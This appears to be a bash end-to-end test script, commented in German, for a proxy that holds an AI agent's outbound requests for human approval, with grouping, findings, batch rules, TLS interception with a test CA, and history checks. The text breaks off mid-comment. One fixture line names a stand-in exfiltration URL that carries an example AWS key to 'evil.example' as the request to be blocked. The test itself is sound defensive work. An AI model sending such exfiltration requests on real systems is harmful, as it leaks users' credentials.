#!/usr/bin/env bash
# Das Demoskript des Meilensteins M2 (HUM-036).
#
# M1 hat gezeigt, dass die Kiste dicht ist und dass eine einzelne Entscheidung
# wirkt. M2 zeigt den ersten vollständigen Arbeitsabschnitt: Ein Agent stellt in
# wenigen Sekunden siebzehn Anfragen an drei Hosts, ein Mensch sieht sie
# gruppiert, gibt eine ganze Gruppe mit einer Sitzungsregel frei, blockt eine
# Anfrage, lässt eine laufen und findet danach alles in der Historie wieder.
#
# Belegt werden in einem Lauf:
#
#   1. Gruppierung. Der Daemon kennt zu jedem Fluss die registrierbare Domäne;
#      zwölf Anfragen an die Paket-Registry sind eine Gruppe, zwei an den
#      Code-Host eine zweite, eine an den dritten Host eine dritte.
#   2. Funde. Die Anfrage mit der Mailadresse und die mit dem AWS-Schlüssel
#      tragen je einen Fund, bevor irgendjemand entscheidet.
#   3. Stapel-Freigabe mit Sitzungsregel. Zwölf gehaltene Anfragen werden
#      freigegeben, und die Regel, die dabei entsteht, gilt nur für diese
#      Sitzung.
#   4. Block, Freigabe, Zeitüberschreitung. Der Agent bekommt 403 mit Grund und
#      Notiz, 200 mit dem Inhalt des Ziels, und 504, wo niemand entschieden hat.
#   5. Was die Regel danach entscheidet. Eine spätere Anfrage an denselben Host
#      erscheint nie in der Warteschlange und trägt die Id der Sitzungsregel.
#   6. Der TLS-Weg. Jede Anfrage des Agenten geht über `https://`: CONNECT,
#      Blatt aus der eigenen CA zum Agenten, Handschlag zum Ziel gegen die
#      Wurzel aus `resolver.test_ca`, die der Daemon nur annimmt, weil dieser
#      Lauf ihn mit `--allow-test-ca` gestartet hat (HUM-087). Die Funde weiter
#      oben entstehen damit in entschlüsselten Rümpfen.
#   7. Die Historie: dieselben siebzehn Flüsse, mit Filtern über Entscheidung,
#      Grund, Funde und Regel — die Menge, aus der der Export entsteht.
#
# Gefahren wird alles über die Kommandozeile `humanitl`, nicht über einen
# eigenen gRPC-Klienten, und der Agent spricht über `curl` mit dem Proxy:
# Gemessen werden sollen die Codepfade, die später beim Nutzer laufen
# (CONVENTIONS.md 3.11, ADR-018).
#
# Der ganze Lauf liegt in einem eigenen Nutzer- und Netz-Namensraum, aus
# denselben zwei Gründen wie bei M1: Das Ziel braucht eine Adresse, die der
# Proxy erreichen darf (also keine private), und der Namensraum hat keine Route
# nach draußen, der Lauf also kein Netz.
#
#   ./tests/e2e/m2_first_decision/run.sh   bauen und laufen
#   E2E_SKIP_BUILD=1 …                     die Binaries nehmen, wie sie sind
#   E2E_TRACE=1 …                          zusätzlich `set -x` (die CI setzt es)
#   M2_UI=0 …                              ohne Oberfläche; dann entscheidet
#                                          die Kommandozeile, und über den
#                                          Bildschirm und über das HAR-Format
#                                          sagt der Lauf nichts
#
# Exit-Codes: 0 alles belegt, 1 eine Behauptung hielt nicht oder eine
# Voraussetzung fehlte, 130 ein Abbruch durch ein Signal. Jede geprüfte
# Behauptung steht als eigene Zeile im Protokoll, auch wenn sie hielt, und am
# Ende steht, wie viele es waren.
#
# --- Was ein grüner Lauf trägt, und was nicht --------------------------------
#
# Seit HUM-097 fährt der Lauf beide Hälften: Der Bildschirm läuft unter `xvfb`
# mit, **während** gehalten wird, trifft die Entscheidungen der Abschnitte 2
# bis 4 und schreibt am Ende die HAR-Datei, die Schritt 10 liest. Ein grünes
# `e2e-xvfb` heißt damit „M2 hält" und nicht mehr „die Daemon-Hälfte von M2
# hält".
#
# Ein Gate ist nur so viel wert, wie ein späterer Leser über seine Reichweite
# weiß. Deshalb ausdrücklich:
#
#   * Mit `M2_UI=0` entscheidet die Kommandozeile, und dann sagt der Lauf
#     nichts über den Bildschirm und nichts über das HAR-Format. Der Schalter
#     ist für Maschinen ohne `flutter` oder `xvfb` da; die CI fährt ohne ihn.
#   * Er sagt **nichts über eine Verweigerung ohne das Flag**. Dieser Lauf
#     fährt mit `--allow-test-ca`; dass dieselbe Wurzel ohne das Flag **nicht**
#     gilt, misst der Rust-Test `a_test_ca_is_only_trusted_with_the_flag` in
#     `daemon/bin/humanitld/tests/daemon_end_to_end.rs`. Eine zweite
#     Daemon-Instanz nur für diese Richtung stünde hier nicht (HUM-087).
#   * Er sagt nichts über eine zweite Sitzung, über Neustarts (das prüft M1),
#     über OpenCode (HUM-046) und über Benachrichtigungen (abgeschaltet).
#
# Was er trägt, steht oben in der Aufzählung, und jede einzelne Behauptung
# steht im Protokoll des Laufs.

set -euo pipefail

M2_DIR="$(cd "$(dirname "$0")" && pwd)"
E2E_ROOT="$(cd "$M2_DIR/../../.." && pwd)"
E2E_SCRIPT="$M2_DIR/run.sh"
E2E_SHELL=bash
export E2E_ROOT E2E_SCRIPT E2E_SHELL

# shellcheck source=tests/e2e/lib.sh
. "$E2E_ROOT/tests/e2e/lib.sh"

if [ "${E2E_TRACE:-0}" = 1 ]; then
    set -x
fi

# --- Was dieser Lauf erwartet ------------------------------------------------

# Die Oberflächen-Hälfte des Laufs. Sie treibt dieselben Entscheidungen über
# den Bildschirm und schreibt danach die HAR-Datei.
M2_UI_TEST="$E2E_ROOT/app/integration_test/m2_first_decision_test.dart"

# So viele Behauptungen prüft ein vollständiger Lauf, je Zweig. Die
# Selbstprüfung am Ende vergleicht die Zahl mit dem Zähler aus `lib.sh`. Ein
# Skript, das grün ist, weil ein Zweig übersprungen wurde, ist schlimmer als
# keines; deshalb steht die Zahl hier und nicht im Kopf eines Menschen.
#
# Zwei Zahlen und nicht eine: Mit Oberfläche entfallen die Abschnitte 2 bis 4,
# weil dort der Bildschirm entscheidet, und Schritt 10 kommt dazu. Eine
# gemeinsame Konstante müsste die kleinere der beiden sein und ließe den
# größeren Zweig unbewacht (HUM-097).
M2_EXPECTED_ASSERTIONS_CLI=71
M2_EXPECTED_ASSERTIONS_SCREEN=77

# Die Ports des Ziels. Im eigenen Netz-Namensraum ist der Lauf root und darf
# auch die privilegierten binden; damit braucht der Proxy keine Portumlenkung
# (`backlog/CONVENTIONS.md` 4.22).
M2_HTTP_PORT=80
M2_HTTPS_PORT=443

# Die Haltefrist dieses Laufs, in Sekunden. Sie steht auch in `config.toml`;
# hier wird sie zusätzlich über die Umgebung gesetzt, weil `start_daemon` sie so
# entgegennimmt, und der Wert von hier gewinnt.
#
# Zwei Werte, weil die beiden Zweige verschieden viel Zeit brauchen, um
# dieselben zwölf Anfragen zu entscheiden. Die Kommandozeile schickt zwölf
# `humanitl`-Aufrufe hintereinander; das ist auf jeder Hardware in wenigen
# Sekunden durch. Der Bildschirm muss dafür zeichnen, auf Ereignisse warten und
# klicken, und er tut das in einem Xvfb auf einem geteilten Läufer. Am
# 2026-09-12 ist der Lauf 34700824623 in CI genau daran gescheitert: derselbe
# Stand war lokal grün, in CI brauchte der Schritt 101 Sekunden statt der 73 bis
# 80 der grünen Läufe, und der Treiber kam mit den zwölf Anfragen nicht mehr
# innerhalb der Frist durch. Nachgestellt mit `M2_HOLD_TIMEOUT=4` auf dem
# Entwicklungsrechner: „and the daemon has all twelve of them decided allow:
# expected 12, got 0", also genau der Fehlschlag aus CI.
#
# 30 Sekunden sind nicht großzügig gemeint, sondern gemessen: Der Bildschirm
# braucht hier rund drei, und drei Sekunden Bedarf gegen zehn Sekunden Frist ist
# kein Abstand, der einen dreifach langsameren Läufer überlebt. Der Preis sind
# zwanzig Sekunden mehr Laufzeit im Schritt mit der Zeitüberschreitung, denn
# dort wartet der Lauf die Frist ab.
M2_HOLD_TIMEOUT_CLI=10
M2_HOLD_TIMEOUT_SCREEN=30

# Die Hosts, für die das Testzertifikat gilt.
M2_HOSTS="registry.npmjs.org api.github.com evil.example"

# Die drei Adressen, an denen der Lauf den Agenten festnagelt.
M2_URL_BLOCKED='https://evil.example/exfil?d=AKIAIOSFODNN7EXAMPLE'
M2_URL_ALLOWED='https://api.github.com/graphql'
M2_URL_TIMEOUT='https://api.github.com/repos/x/y'
M2_URL_TLS='https://registry.npmjs.org/tls-probe'

# Der Pfad der positiven Kontrolle zu Schritt 7. Sie geht am Proxy vorbei,
# direkt aus dem Namensraum, und hat einen eigenen Pfad, damit die Gegenprobe
# am Ziel die eine bediente TLS-Anfrage von der unterscheiden kann, die durch
# den Proxy ging und dort scheiterte.
M2_PATH_TLS_CONTROL='/tls-control'

# --- Voraussetzungen ---------------------------------------------------------

for tool in bwrap curl jq python3 ip unshare openssl; do
    command -v "$tool" > /dev/null 2>&1 ||
        e2e_die "$tool is missing; the demo needs bubblewrap, curl, jq, python3, iproute2, util-linux and openssl"
done

# --- Wer entscheidet ---------------------------------------------------------
#
# Zwei Treiber zugleich wären ein Wettlauf: Der Bildschirm und die
# Kommandozeile griffen nach denselben gehaltenen Anfragen. Der Lauf wählt
# deshalb einen von beiden und sagt welchen. Mit Oberfläche entscheidet der
# Bildschirm, und die Abschnitte 2 bis 4 dieses Skripts entfallen; ohne sie
# bleibt es beim Weg über `humanitl`.
case "${M2_UI:-auto}" in
0)
    M2_SCREEN=0
    ;;
1 | auto)
    M2_SCREEN=1
    ;;
*)
    e2e_die "M2_UI must be 0, 1 or auto, not \"$M2_UI\""
    ;;
esac

# Die Frist gehört zum Zweig, nicht zum Lauf: siehe die Rechnung beim Block
# `M2_HOLD_TIMEOUT_*` weiter oben.
if [ "$M2_SCREEN" = 1 ]; then
    M2_HOLD_TIMEOUT="$M2_HOLD_TIMEOUT_SCREEN"
else
    M2_HOLD_TIMEOUT="$M2_HOLD_TIMEOUT_CLI"
fi

if [ "$M2_SCREEN" = 1 ] && [ ! -f "$M2_UI_TEST" ]; then
    # Kein stiller Übersprung mehr: Das Gate gälte sonst als erfüllt, während
    # über den Bildschirm und über die HAR-Datei nichts geprüft wäre.
    e2e_die "the integration test of the screen is missing: $M2_UI_TEST. Restore it, or run with M2_UI=0 and know that nothing about the screen and nothing about the HAR export is verified."
fi

if [ "$M2_SCREEN" = 1 ]; then
    command -v flutter > /dev/null 2>&1 ||
        e2e_die "the screen half needs flutter on PATH; run with M2_UI=0 to leave it out"
    command -v xvfb-run > /dev/null 2>&1 ||
        e2e_die "the screen half needs xvfb-run on PATH; run with M2_UI=0 to leave it out"
fi

# m2_build_app — Pakete und die Anwendung, vor dem Wechsel in den Namensraum.
#
# Im Namensraum gibt es kein Netz und der Bildschirm bekommt ein frisches
# `HOME`; ein `flutter pub get` löste dort aus einem leeren Cache nichts mehr
# auf, und das erste `flutter test -d linux` baute die GTK-Anwendung von Null.
# Beides gehört deshalb hierher, und der Paket-Cache des Aufrufers wird dem
# Treiber später ausdrücklich weitergereicht.
m2_build_app() {
    # Die beiden Voraussetzungen gelten auch mit `E2E_SKIP_BUILD=1`: Der
    # Treiber läuft mit `--no-pub`, und im Namensraum gibt es kein Netz. Fehlt
    # eine von beiden, soll die Meldung hier stehen und nicht in einem
    # Protokoll, das niemand aufmacht.
    [ -d "$E2E_ROOT/app/lib/core/ipc/generated" ] ||
        e2e_die "app/lib/core/ipc/generated is missing; run 'make flutter-codegen' first (it needs protoc and protoc-gen-dart)"
    if [ "${E2E_SKIP_BUILD:-0}" = 1 ]; then
        [ -f "$E2E_ROOT/app/.dart_tool/package_config.json" ] ||
            e2e_die "app/.dart_tool/package_config.json is missing; run 'make flutter-get' first, or drop E2E_SKIP_BUILD"
        e2e_say "E2E_SKIP_BUILD=1, using the Flutter app as it is"
        return 0
    fi
    e2e_step "building the Flutter app for the screen half"
    (cd "$E2E_ROOT/app" && flutter pub get) ||
        e2e_die "flutter pub get failed; the screen half cannot run without its packages"
    (cd "$E2E_ROOT/app" && flutter build linux --debug) ||
        e2e_die "flutter build linux --debug failed"
}

# Der Paket-Cache des Aufrufers, festgehalten, solange `HOME` noch seines ist.
M2_PUB_CACHE="${PUB_CACHE:-$HOME/.pub-cache}"

# Gebaut wird vor dem Wechsel in den Namensraum, weil es dort kein Netz gibt.
if [ "${E2E_IN_NAMESPACE:-0}" != 1 ] && [ "$M2_SCREEN" = 1 ]; then
    m2_build_app
fi
e2e_build
e2e_enter_namespace "$@"

# --- Der Wegwerf-Baum --------------------------------------------------------

E2E_OUT="$E2E_ROOT/target/e2e/m2"
rm -rf "$E2E_OUT"
mkdir -p "$E2E_OUT"

e2e_short_workdir
M2_CA_DIR="$E2E_WORKDIR/ca-test"
M2_AGENT_LOG="$E2E_WORKDIR/out/agent.jsonl"
M2_AGENT_ERR="$E2E_WORKDIR/out/agent.log"
M2_UPSTREAM_LOG="$E2E_WORKDIR/out/upstream.log"
M2_HAR="$E2E_WORKDIR/out/m2.har"
M2_GROUP_SUMMARY="$E2E_WORKDIR/out/npm-group-summary.txt"
M2_AGENT_PID=""
M2_RULE_ID=""
M2_BATCH_IDS="$E2E_WORKDIR/npm-batch.txt"

# Die drei Dateien, über die Skript und Bildschirm sich verständigen. Zwei
# Handschläge, weil beide Seiten aufeinander warten müssen: Der Agent darf
# nicht starten, bevor der Bildschirm steht (sonst verfällt der Stapel, während
# `flutter` noch baut), und der Bildschirm darf nicht entscheiden, bevor das
# Skript die Ids des Stapels festgehalten hat (sonst vergleichen die
# Abschnitte 6 und 8 gegen einen leeren Text). Das Protokoll des Treibers ist
# das dritte und liegt im Artefakt-Ordner.
M2_UI_READY="$E2E_WORKDIR/ui-ready"
M2_UI_GO="$E2E_WORKDIR/ui-go"
M2_UI_LOG="$E2E_WORKDIR/out/ui.log"
M2_UI_PID=""

# So lange darf der Treiber nach seiner Bereitschaft noch laufen. Der Test
# selbst bricht nach vier Minuten ab; diese Frist ist der Riegel darüber, damit
# ein hängender Flutter-Läufer nicht den ganzen Job blockiert, bis dessen
# eigenes Zeitlimit ihn erschlägt.
M2_UI_WAIT_SECS=600

# Die Prozessgruppe dieses Skripts. Der Treiber bekommt eine eigene (`setsid`),
# und nur weil die beiden verschieden sind, darf das Aufräumen eine ganze
# Gruppe erschlagen: `kill $M2_UI_PID` träfe sonst die Zwischenschale und ließe
# `xvfb-run` und `Xvfb` darunter stehen.
M2_OWN_PGID=$(ps -o pgid= -p $$ 2> /dev/null | tr -d ' ') || M2_OWN_PGID=""

# m2_kill_screen — den Bildschirm-Treiber und alles unter ihm beenden.
#
# Steht vor `collect`, weil der Trap `collect` schon greifen kann, bevor die
# übrigen Helfer dieses Laufs definiert sind; eine fehlende Funktion nähme dem
# Aufräumen sonst auch `stop_daemon`.
#
# Erschlagen wird die **Prozessgruppe**, nicht der eine Prozess: Unter dem
# Treiber hängen `xvfb-run`, `Xvfb` und der Flutter-Läufer, und ein `kill` auf
# die Zwischenschale ließe sie stehen. Die Gruppe ist eine eigene, weil
# `m2_start_screen` mit `setsid` startet; taugt die Auskunft von `ps` nicht
# oder ist es doch die Gruppe dieses Skripts, wird nur der Treiber selbst
# erschlagen — ein Lauf, der sich selbst umbrächte, wäre schlimmer als ein
# übrig gebliebener X-Server.
m2_kill_screen() {
    [ -n "${M2_UI_PID:-}" ] || return 0
    # `|| m2_kill_pgid=""` ist Pflicht und keine Vorsicht: Dieses Skript läuft
    # mit `set -euo pipefail`, und `ps` auf einen längst beendeten Treiber gibt
    # 1 zurück. Ohne den Auffang stürbe das Aufräumen genau hier — vor dem
    # Kopieren der Artefakte und vor `stop_daemon`. Gemessen am 2026-09-12: ein
    # roter Lauf hinterließ ein leeres `target/e2e/m2`.
    m2_kill_pgid=$(ps -o pgid= -p "$M2_UI_PID" 2> /dev/null | tr -d ' ') ||
        m2_kill_pgid=""
    if [ -n "$m2_kill_pgid" ] && [ "$m2_kill_pgid" != "${M2_OWN_PGID:-}" ]; then
        m2_kill_target="-$m2_kill_pgid"
    else
        m2_kill_target="$M2_UI_PID"
    fi
    kill -TERM "$m2_kill_target" 2> /dev/null || true
    # Eine Sekunde für den geordneten Abgang, dann hart. `xvfb-run` räumt
    # seinen X-Server und sein Xauthority nur beim geordneten auf.
    m2_kill_left=10
    while [ "$m2_kill_left" -gt 0 ] && kill -0 "$M2_UI_PID" 2> /dev/null; do
        sleep 0.1
        m2_kill_left=$((m2_kill_left - 1))
    done
    kill -KILL "$m2_kill_target" 2> /dev/null || true
    wait "$M2_UI_PID" 2> /dev/null || true
    M2_UI_PID=""
}

# Aufräumen, das auch nach einem Fehlschlag greift: erst die Prozesse dieses
# Laufs, dann die Protokolle in den Artefakt-Ordner, dann der Wegwerf-Baum. Was
# der Lauf angelegt hat, liegt vollständig unter `$E2E_WORKDIR` und unter
# `$E2E_OUT`; auf dem Rechner bleibt sonst nichts.
collect() {
    if [ -n "$M2_AGENT_PID" ]; then
        kill "$M2_AGENT_PID" 2> /dev/null || true
        wait "$M2_AGENT_PID" 2> /dev/null || true
        M2_AGENT_PID=""
    fi
    m2_kill_screen
    stop_daemon
    stop_fake_upstream
    if [ -n "${E2E_WORKDIR:-}" ] && [ -d "$E2E_WORKDIR" ]; then
        cp -f "$E2E_WORKDIR"/out/* "$E2E_OUT/" 2> /dev/null || true
        cp -f "$E2E_WORKDIR"/daemon.log "$E2E_OUT/" 2> /dev/null || true
        case "$E2E_WORKDIR" in
        /tmp/hum-e2e-*) rm -rf "$E2E_WORKDIR" ;;
        esac
    fi
}
# Auch bei einem Abbruch, nicht nur beim geordneten Ende: `Strg-C` während des
# Wartens auf den Agenten würde sonst nur den Wartelauf abbrechen, das Skript
# liefe weiter und meldete am Ende „OK" (`lib.sh`, `e2e_trap`).
e2e_trap collect

# --- Helfer dieses Laufs -----------------------------------------------------

# m2_flow_page [FILTER] — eine Seite der Flow-Liste als JSON.
m2_flow_page() {
    if [ -z "${1:-}" ]; then
        humanitl --json flows list 2> /dev/null
    else
        humanitl --json flows list "$1" 2> /dev/null
    fi
}

# m2_count [FILTER] — wie viele Flüsse der Filter trifft, `-1` bei einem Fehler.
m2_count() {
    if ! m2_count_out=$(m2_flow_page "${1:-}" | jq -r '.flows | length' 2> /dev/null); then
        m2_count_out=-1
    fi
    [ -n "$m2_count_out" ] || m2_count_out=-1
    printf '%s\n' "$m2_count_out"
}

# m2_ids FILTER — die Ids der Treffer, eine je Zeile.
m2_ids() {
    m2_flow_page "$1" | jq -r '.flows[].flow_id'
}

# m2_row FILTER — die erste Zeile des Filters als JSON, sonst Rückgabewert 1.
m2_row() {
    m2_row_out=$(m2_flow_page "$1" | jq -c '.flows[0] // empty' 2> /dev/null) || return 1
    [ -n "$m2_row_out" ] || return 1
    printf '%s\n' "$m2_row_out"
}

# m2_field FILTER FIELD — ein Feld der ersten Zeile, oder der leere Text.
m2_field() {
    m2_row "$1" | jq -r --arg field "$2" '.[$field] // ""' 2> /dev/null || true
}

# m2_wait_count SECONDS COUNT FILTER — warten, bis der Filter COUNT Zeilen hat.
#
# Gibt die zuletzt gemessene Zahl auf stdout aus, damit der Aufrufer sie in die
# Meldung schreiben kann. Gepollt wird alle 200 ms: Die Aufzeichnung schreibt
# gebündelt, eine Zahl ist deshalb erst nach einem kurzen Moment vollständig.
m2_wait_count() {
    m2_wait_left=$(($1 * 5))
    m2_wait_want="$2"
    m2_wait_filter="$3"
    m2_wait_seen=-1
    while [ "$m2_wait_left" -gt 0 ]; do
        m2_wait_seen=$(m2_count "$m2_wait_filter")
        if [ "$m2_wait_seen" = "$m2_wait_want" ]; then
            printf '%s\n' "$m2_wait_seen"
            return 0
        fi
        sleep 0.2
        m2_wait_left=$((m2_wait_left - 1))
    done
    printf '%s\n' "$m2_wait_seen"
    return 1
}

# m2_expect_count DESCRIPTION SECONDS COUNT FILTER — warten und behaupten.
m2_expect_count() {
    m2_expect_seen=$(m2_wait_count "$2" "$3" "$4") || true
    e2e_expect "$1" "$3" "$m2_expect_seen"
}

# m2_agent_field URL FIELD — ein Feld aus der Ergebniszeile des Agenten.
m2_agent_field() {
    jq -r --arg url "$1" --arg field "$2" \
        'select(.url == $url) | .[$field]' "$M2_AGENT_LOG" 2> /dev/null || true
}

# m2_upstream_hits PATTERN — wie oft das Ziel eine passende Anfrage bedient hat.
m2_upstream_hits() {
    grep -c -- "$1" "$M2_UPSTREAM_LOG" 2> /dev/null || true
}

# m2_start_upstream — das Ziel starten, im Klartext und über TLS.
#
# Setzt `E2E_FAKE_PID`, damit `stop_fake_upstream` aus `lib.sh` es wieder
# beendet. Die Bereitschaft kommt über eine Fifo zurück, damit das Skript nicht
# raten muss, wann die Listener stehen.
m2_start_upstream() {
    m2_fifo="$E2E_WORKDIR/upstream.ready"
    rm -f "$m2_fifo"
    mkfifo "$m2_fifo" || e2e_die "cannot create the fifo for the upstream"
    python3 "$E2E_ROOT/tests/e2e/fake-upstream/fake_upstream.py" \
        --address "$E2E_FAKE_ADDR" \
        --http-port "$M2_HTTP_PORT" \
        --https-port "$M2_HTTPS_PORT" \
        --cert "$M2_CA_DIR/upstream.crt" \
        --key "$M2_CA_DIR/upstream.key" \
        > "$m2_fifo" 2> "$M2_UPSTREAM_LOG" &
    E2E_FAKE_PID=$!
    m2_ready=""
    read -r m2_ready < "$m2_fifo" || true
    rm -f "$m2_fifo"
    # Die ganze Zeile, nicht nur ihr Anfang: Ohne Zertifikat meldet der Server
    # `https=-` und lauscht nur im Klartext. Ein Lauf, der das übersieht,
    # bewiese in Schritt 7 nur, dass auf 443 niemand antwortet.
    if [ "$m2_ready" != "READY http=$M2_HTTP_PORT https=$M2_HTTPS_PORT" ]; then
        e2e_die "the fake upstream did not come up as asked (got \"$m2_ready\"): $(cat "$M2_UPSTREAM_LOG" 2> /dev/null)"
    fi
    e2e_say "fake upstream on $E2E_FAKE_ADDR ($m2_ready, pid $E2E_FAKE_PID)"
}

# m2_write_config — die Konfiguration dieses Laufs in den XDG-Baum legen.
#
# `start_daemon` legt denselben Baum an und überschreibt die Datei nicht; Daemon
# und Kommandozeile finden sie über `humanitl_config::discover_with`, ohne dass
# ihnen jemand einen Pfad nennen müsste.
m2_write_config() {
    mkdir -p "$E2E_WORKDIR/config/humanitl"
    sed -e "s|@UPSTREAM_ADDR@|$E2E_FAKE_ADDR|g" \
        -e "s|@TEST_CA@|$M2_CA_DIR/test-ca.crt|g" \
        "$M2_DIR/config.toml" > "$E2E_WORKDIR/config/humanitl/config.toml"
    e2e_say "config $E2E_WORKDIR/config/humanitl/config.toml"
}

# m2_wait_file PATH SECONDS WHAT — warten, bis die Datei da ist.
#
# Gepollt alle 200 ms. Der Rückgabewert sagt, ob sie kam; der Aufrufer
# entscheidet, ob das ein Abbruch ist.
m2_wait_file() {
    m2_file_left=$(($2 * 5))
    while [ "$m2_file_left" -gt 0 ]; do
        if [ -e "$1" ]; then
            return 0
        fi
        # Ein Treiber, der schon gestorben ist, kommt nicht mehr wieder.
        if [ -n "$M2_UI_PID" ] && ! kill -0 "$M2_UI_PID" 2> /dev/null; then
            return 1
        fi
        sleep 0.2
        m2_file_left=$((m2_file_left - 1))
    done
    return 1
}

# m2_start_screen — den Bildschirm-Treiber im Hintergrund starten.
#
# Er läuft, **während** gehalten wird, und nicht danach: Ein Bildschirm, der
# sich erst nach dem Ende des Agenten verbände, fände nichts mehr vor, worüber
# er entscheiden könnte.
#
# Der Treiber bekommt genau den XDG-Baum, in dem der Daemon dieses Laufs
# Socket, Token und CA abgelegt hat. `XDG_RUNTIME_DIR` allein genügt dafür:
# `DaemonPaths.resolve` in `app/lib/core/ipc/daemon_paths.dart` leitet Socket
# und Token daraus ab, genau wie `humanitl_config::Paths` es auf der Rust-Seite
# tut. `HUMANITL_SOCKET` und `HUMANITL_TOKEN` stehen daneben, damit der Test
# die beiden Pfade nehmen kann, ohne sie noch einmal herzuleiten;
# `HUMANITL_E2E_HAR` sagt, wohin die Export-Datei gehört, und die Anwendung
# wählt daraufhin ihr zweites Exportziel — der Test überschreibt dafür keinen
# Provider, sonst bliebe der Produktivweg ungeprüft.
#
# `PUB_CACHE` muss mit: Der Treiber läuft mit einem frischen `HOME` und ohne
# Netz, und `flutter` suchte seine Pakete sonst in einem leeren Verzeichnis.
# `--no-pub` und `--no-version-check` gehören zur selben Tatsache: Ein
# `flutter test`, das seine Abhängigkeiten noch einmal auflösen oder nach einer
# neueren SDK-Fassung sehen will, hängt hier ohne Erklärung, bis eine
# Zeitüberschreitung greift. Aufgelöst und gebaut ist vorher, außerhalb des
# Namensraums (`m2_build_app`).
#
# Die Auflösung ist Absicht — unter 1400x900 greift das schmale Layout, und die
# Selektoren des Tests fänden ihre Elemente nicht.
m2_start_screen() {
    rm -f "$M2_UI_READY" "$M2_UI_GO"
    # `setsid` gibt dem Treiber eine eigene Prozessgruppe, damit das Aufräumen
    # ihn samt `xvfb-run` und `Xvfb` erschlagen kann, ohne dieses Skript mit zu
    # treffen; `env -C` erspart die Zwischenschale, die dafür nur im Weg stünde.
    setsid env -C "$E2E_ROOT/app" \
        XDG_RUNTIME_DIR="$E2E_XDG_RUNTIME" \
        XDG_DATA_HOME="$E2E_XDG_DATA" \
        XDG_CONFIG_HOME="$E2E_XDG_CONFIG" \
        HOME="$E2E_HOME" \
        PUB_CACHE="$M2_PUB_CACHE" \
        FLUTTER_SUPPRESS_ANALYTICS=1 \
        HUMANITL_SOCKET="$DAEMON_SOCK" \
        HUMANITL_TOKEN="$DAEMON_TOKEN" \
        HUMANITL_E2E_HAR="$M2_HAR" \
        HUMANITL_E2E_GROUP_SUMMARY="$M2_GROUP_SUMMARY" \
        HUMANITL_E2E_READY="$M2_UI_READY" \
        HUMANITL_E2E_GO="$M2_UI_GO" \
        HUMANITL_E2E_SHOTS="$E2E_WORKDIR/out" \
        xvfb-run -a --server-args='-screen 0 1600x1000x24' \
        flutter --no-version-check test --no-pub \
        integration_test/m2_first_decision_test.dart -d linux \
        > "$M2_UI_LOG" 2>&1 &
    M2_UI_PID=$!
    e2e_say "screen driver started (pid $M2_UI_PID), log $M2_UI_LOG"
    # Erst wenn der Bildschirm steht und der Daemon ihm geantwortet hat, darf
    # der Agent loslegen: Sein Stapel hat ab der ersten Anfrage nur die
    # Haltefrist, und ein Treiber, der in dieser Zeit noch startet, verbrauchte
    # sie für den Bau der Anwendung.
    m2_wait_file "$M2_UI_READY" 600 ||
        e2e_die "the screen did not come up within 600s; its log is in $M2_UI_LOG"
    e2e_say "the screen is up and the daemon answered it"
}

# m2_wait_screen — auf das Ende des Treibers warten, aber nicht endlos.
#
# Ein `wait` ohne Riegel hinge, bis das Zeitlimit des ganzen CI-Jobs zuschlägt,
# und das Protokoll des Treibers landete nie in den Artefakten. Der Wachhund
# erschlägt ihn nach `M2_UI_WAIT_SECS`; `wait` kommt dann zurück und der
# Aufrufer sieht einen Fehlschlag statt eines hängenden Jobs.
#
# Der Rückgabewert ist der des Treibers, 143 nach einem `SIGTERM` des
# Wachhunds.
m2_wait_screen() {
    (
        sleep "$M2_UI_WAIT_SECS"
        kill -0 "$M2_UI_PID" 2> /dev/null || exit 0
        printf 'e2e: the screen driver still runs after %ss; ending it\n' \
            "$M2_UI_WAIT_SECS" >&2
        m2_kill_screen
    ) &
    m2_screen_watchdog=$!
    m2_screen_status=0
    wait "$M2_UI_PID" || m2_screen_status=$?
    kill "$m2_screen_watchdog" 2> /dev/null || true
    wait "$m2_screen_watchdog" 2> /dev/null || true
    M2_UI_PID=""
    return "$m2_screen_status"
}

# --- Zertifikat, Ziel, Daemon ------------------------------------------------

e2e_step "the run brings its own certificate authority, its own target and its own daemon"

# shellcheck disable=SC2086 # M2_HOSTS ist absichtlich eine Wortliste.
sh "$E2E_ROOT/tests/e2e/fake-upstream/gen-test-ca.sh" "$M2_CA_DIR" $M2_HOSTS ||
    e2e_die "openssl could not create the test certificate"
e2e_say "test CA in $M2_CA_DIR, valid for $M2_HOSTS"

m2_start_upstream
m2_write_config
# `--allow-test-ca` ist das, was diesen Lauf über TLS fahren lässt (HUM-087).
# Es steht hier im Startbefehl und nicht in einer Umgebungsvariablen: Ein Flag,
# das das Vertrauen des Daemons erweitert, soll an genau einer sichtbaren
# Stelle stehen. Ohne es scheiterte jeder Handschlag nach oben mit `502
# upstream_tls`, und der Lauf käme über Schritt 1 nicht hinaus.
start_daemon "$E2E_WORKDIR/state" "$E2E_WORKDIR" "$M2_HOLD_TIMEOUT" --allow-test-ca

# Das Laufzeitverzeichnis gehört dem Menschen allein. Socket und Sitzungstoken
# liegen darin, und der Setup-Bildschirm hält den Start an, solange Gruppe oder
# Welt hineindürfen (`DOCTOR_004`). Auf einem echten Rechner ist
# `$XDG_RUNTIME_DIR` 0700; der Wegwerf-Baum dieses Laufs entsteht unter der
# `umask` des Aufrufers und wäre es sonst nicht — mit `umask 002` bekäme der
# Bildschirm-Treiber statt der Warteschlange den Setup-Bildschirm zu sehen.
chmod 700 "$E2E_XDG_RUNTIME"

# Der Beleg, dass das Ziel antwortet, bevor irgendwo behauptet wird, eine
# Anfrage sei nicht bei ihm angekommen. Ohne diese Zeile hieße ein
# fehlgeschlagener Aufruf nur „hier antwortet niemand".
reachable=$(curl -sS --max-time 5 --noproxy '*' \
    "http://$E2E_FAKE_ADDR:$M2_HTTP_PORT/reachable" || true)
e2e_expect "the target answers on the host of the namespace" /reachable \
    "$(printf '%s' "$reachable" | jq -r '.path // ""' 2> /dev/null || true)"

# Der Wert aus dem JSON, nicht eine Teilzeichenkette darin: `grep` fände die Id
# auch in einem Feld, das gar nicht `session_id` heißt, und wäre gegen jede
# Umbenennung blind.
info=$(daemon_info)
e2e_expect_match "the daemon serves GetInfo and runs a proxy session" \
    '^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$' \
    "$(printf '%s' "$info" | jq -r '.session_id // ""')"

# Die Konfiguration dieses Laufs, mit ihren Werten und nicht nur ihren
# Schlüsseln. Scheiterte die Ersetzung der Platzhalter in `config.toml` still,
# stünde `@UPSTREAM_ADDR@` in der Datei und `@TEST_CA@` als Pfad; Schritt 7
# belegte dann, dass eine Testwurzel nichts bewirkt, während gar keine
